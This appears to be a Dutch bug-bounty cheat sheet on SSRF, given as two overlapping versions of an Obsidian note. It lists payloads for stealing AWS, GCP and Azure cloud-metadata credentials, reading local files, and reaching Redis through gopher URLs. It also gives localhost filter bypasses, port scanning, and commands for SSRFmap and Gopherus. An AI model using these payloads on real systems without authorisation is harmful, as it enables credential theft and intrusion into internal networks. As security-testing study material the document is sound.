
### Volgende Categorie: Server-Side Request Forgery (SSRF)

Dit is een van de belangrijkste categorieën voor **Cloud Hacking** (AWS/Google Cloud). Als je dit vindt, krijg je vaak enorme bounties ($5.000+).

Hier is de Obsidian notitie voor SSRF.

Markdown

````
# ☁️ Server-Side Request Forgery (SSRF)

==Concept: Je dwingt de server om een HTTP-verzoek te doen naar een intern doelwit (dat jij van buitenaf niet kunt bereiken).==



---

## 🕵️‍♂️ 1. Detection (Blind SSRF)
*Vaak zie je de reactie van de server niet. Je moet testen of de server "naar buiten belt".*

**Stap 1: Start een Listener**
Je hebt een server nodig die luistert. Gebruik ProjectDiscovery's tool (gratis) of Burp Collaborator.

```bash
# Start interactsh in je terminal
interactsh-client -v
````

_(Kopieer de URL die je krijgt, bijv: `c5s2...o6j1.oast.pro`)_

**Stap 2: Injecteer de URL** Plak jouw listener URL op plekken waar de server een URL verwacht:

- Webhooks
    
- Profile Picture upload (URL import)
    
- PDF Generators
    
- XML Parsers
    

**Payloads:**

Plaintext

```
[https://c5s2...o6j1.oast.pro](https://c5s2...o6j1.oast.pro)
[http://c5s2...o6j1.oast.pro:80](http://c5s2...o6j1.oast.pro:80)
[http://c5s2...o6j1.oast.pro:25](http://c5s2...o6j1.oast.pro:25)
```

---

## ☁️ 2. Cloud Metadata (De Jackpot)

_Als SSRF werkt, probeer dan interne Cloud Keys te stelen. Dit is bijna altijd een Critical finding._

**AWS (Amazon Web Services)** _Probeer deze URL in te vullen in het kwetsbare veld:_

Plaintext

```
[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)
```

_Als je een rol-naam terugkrijgt, plak die erachter:_

Plaintext

```
[http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME](http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME)
```

_Zie je `AccessKeyId` en `SecretAccessKey`? -> **STOP en Rapporteer direct!**_

**Google Cloud (GCP)** _Vereist vaak een header, dus lastiger via simpele URL input, maar probeer:_

Plaintext

```
[http://metadata.google.internal/computeMetadata/v1/](http://metadata.google.internal/computeMetadata/v1/)
[http://169.254.169.254/computeMetadata/v1/](http://169.254.169.254/computeMetadata/v1/)
```

**Azure**

Plaintext

```
[http://169.254.169.254/metadata/instance?api-version=2021-02-01](http://169.254.169.254/metadata/instance?api-version=2021-02-01)
```

---

## 🔄 3. Schema Bypasses (Filter Evasion)

_Als de server `http://` blokkeert of `169.254...` filtert._

**Andere protocollen (Schemes):** Soms kun je bestanden lezen of poorten scannen met andere voorvoegsels.

Plaintext

```
file:///etc/passwd
dict://127.0.0.1:25
sftp://evil.com
tftp://evil.com
gopher://127.0.0.1:25/_HELO%20world
```

**IP Obfuscation (IP vermommen):** De server blokkeert `127.0.0.1`, maar snapt hij deze variaties ook?

- **Decimal IP:** `http://2130706433` (is hetzelfde als 127.0.0.1)
    
- **Octal IP:** `http://0177.0.0.1`
    
- **Hex IP:** `http://0x7f000001`
    
- **DNS Rebinding:** Gebruik een domein dat naar 127.0.0.1 wijst (bijv. `localtest.me`).
    
    - `http://localtest.me`
        
    - `http://customer-db.localtest.me`
        

---

## 🚧 4. Burp Suite (SSRF Scannen)

**Handmatig (Repeater):**

1. Stuur request naar Repeater.
    
2. Vervang de URL in de body/parameter.
    
3. Check de response tijd.
    
    - `http://127.0.0.1:80` -> Snel (Poort open?)
        
    - `http://127.0.0.1:1234` -> Traag (Timeout / Poort dicht?)
        

**Automatisch (Plugins):** Installeer deze plugins via de BApp Store (Pro versie is hier wel veel beter):

- **Collaborator Everywhere:** Injecteert headers om out-of-band interacties te forceren.
    
- **SSRF King:** Automatiseert het scannen naar cloud metadata.
    

---

## 🤖 5. Automating SSRF (Tools)

**SSRFmap** Een tool die automatisch probeert exploits te vinden (zoals Redis RCE via SSRF).

Bash

```
# Clone de repo eerst van Github
python3 ssrfmap.py -r request.txt -p url_parameter -m readfiles
```

**Gopherus** Genereert payloads voor Gopher protocol (om interne services zoals Redis of MySQL aan te vallen).

Bash

```
# Genereer een payload voor Redis
gopherus --exploit redis
```

---

## 📝 Checklist

- [ ] **OOB Check:** Heb ik `interactsh` gebruikt om blinde connecties te testen?
    
- [ ] **Localhost:** Heb ik `127.0.0.1` en `localhost` geprobeerd?
    
- [ ] **Cloud:** Heb ik de AWS IP `169.254.169.254` geprobeerd?
    
- [ ] **Schemes:** Heb ik `file://` geprobeerd om lokale bestanden te lezen?
    
- [ ] **PDF/Image:** Is er een functie die PDF's maakt van een URL? (Klassieke SSRF plek).

````
☁️ Server-Side Request Forgery (SSRF)

==Concept: Je dwingt de server om een HTTP-verzoek te doen naar een doelwit naar keuze (vaak intern).==
*Impact: High / Critical (Toegang tot interne netwerken, Cloud Keys, of lokale bestanden).*



---

## 🕵️‍♂️ 1. Waar moet je zoeken? (Recon)
*Zoek naar functionaliteiten waar de server contact moet maken met een externe bron.*

### Verdachte Functies
1.  **Webhooks:** "Stuur een notificatie naar mijn server als er iets gebeurt."
2.  **File Import:** "Upload via URL", "Importeer profielfoto van URL".
3.  **PDF Generators:** Server bezoekt een URL om er een PDF van te maken.
4.  **Link Previews:** Zoals in WhatsApp/Slack/Twitter (server haalt titel + plaatje op).
5.  **Proxy diensten:** "Check of deze site online is".

### Verdachte Parameters
*Grep in je URL lijst naar deze woorden:*
```text
url=
uri=
dest=
redirect=
src=
path=
file=
u=
endpoint=
report=
````

---

## 🧪 2. Verificatie (De Ping Test)

_Hoe bewijs je dat het werkt?_

### Regular SSRF (Je ziet de response)

Als je de HTML van de opgevraagde pagina terugziet op je scherm.

1. Vul in: `https://google.com`
    
2. Zie je de Google homepage? -> **Kwetsbaar.**
    

### Blind SSRF (Je ziet niks)

De server doet het verzoek wel, maar laat het resultaat niet zien.

1. Start **Interactsh** of **Burp Collaborator**.
    
    Bash
    
    ```
    interactsh-client -v
    ```
    
2. Vul jouw unieke URL in: `http://jouw-id.oast.pro`.
    
3. Kijk in je terminal. Zie je een DNS of HTTP hit? -> **Kwetsbaar.**
    

---

## ☁️ 3. Cloud Metadata Extraction (The Holy Grail)

_Als de server in de cloud draait (AWS, Google, Azure), probeer dan de interne metadata-service te bereiken om credentials te stelen._

> [!DANGER] AWS (Amazon) **IP:** `169.254.169.254`
> 
> **1. Check of het werkt:** `http://169.254.169.254/latest/meta-data/`
> 
> **2. Steel Credentials (IAM Role):** `http://169.254.169.254/latest/meta-data/iam/security-credentials/` _(Als je hier een naam ziet, plak die erachter)_ `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`
> 
> **Gevonden?** Je ziet `AccessKeyId` en `SecretAccessKey`. **STOP en Rapporteer! Critical.**

> [!INFO] Google Cloud (GCP) **IP:** `metadata.google.internal` of `169.254.169.254` _Vereist header: `Metadata-Flavor: Google` (Lastig via URL, maar mogelijk via CRLF injection)._
> 
> **Payload:** `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json`

> [!INFO] Azure **IP:** `169.254.169.254` _Vereist header: `Metadata: true`_
> 
> **Payload:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01`

---

## 🏠 4. Internal Network Scanning

_Als Cloud Metadata niet werkt (of het is geen cloud), scan dan het interne netwerk van het bedrijf._

**Scan Localhost (127.0.0.1):** Kijk of er interne admin panelen draaien die van buitenaf geblokkeerd zijn.

- `http://127.0.0.1:80` (Interne webserver)
    
- `http://127.0.0.1:22` (SSH Banner)
    
- `http://127.0.0.1:3306` (MySQL)
    
- `http://127.0.0.1:6379` (Redis - Gevaarlijk!)
    
- `http://127.0.0.1:8080` (Jenkins/Tomcat)
    

**Gebruik Burp Intruder:** Zet de poort op variabele positie: `http://127.0.0.1:§80§` en brute-force poort 1-65535.

---

## 📜 5. Protocols & Schemes (Advanced)

_SSRF is niet alleen `http://`. Als de server `cURL` gebruikt, werken deze vaak ook._

### `file://` (Local File Inclusion)

Lees bestanden op de server zelf.

- `file:///etc/passwd`
    
- `file:///c:/windows/win.ini`
    

### `dict://` & `sftp://`

Kan soms data lekken of verbindingen maken die firewalls toestaan.

- `dict://127.0.0.1:6379/info`
    

### `gopher://` (Remote Code Execution)

Gopher is een oud protocol dat je toestaat om **ruwe bytes** te sturen (inclusief newlines). Hiermee kun je praten met interne services zoals Redis, Memcached of SMTP om een shell te krijgen.

_Gebruik de tool **Gopherus** om deze payloads te maken._

---

## 🛠️ 6. Tools

**SSRFmap** Automatische scanner voor bekende SSRF targets (AWS, Docker, Redis).

Bash

```
python3 ssrfmap.py -r req.txt -p url_parameter -m readfiles
```

**Gopherus** Genereert payloads voor Gopher protocol exploitatie.

Bash

```
gopherus --exploit redis
```

**Interactsh / Burp Collaborator** Essentieel voor Blind SSRF detectie.

---

## 📝 Checklist SSRF

- [ ] **Callback:** Heb ik `interactsh` gebruikt om te zien of de server naar buiten belt?
    
- [ ] **Cloud:** Heb ik de AWS IP (`169.254.169.254`) geprobeerd?
    
- [ ] **Localhost:** Heb ik poorten gescand op `127.0.0.1`?
    
- [ ] **Schemes:** Heb ik `file://` en `gopher://` geprobeerd?
    
- [ ] **PDF:** Is het een PDF generator? Probeer `<iframe>` tags in de HTML te injecteren die naar localhost wijzen.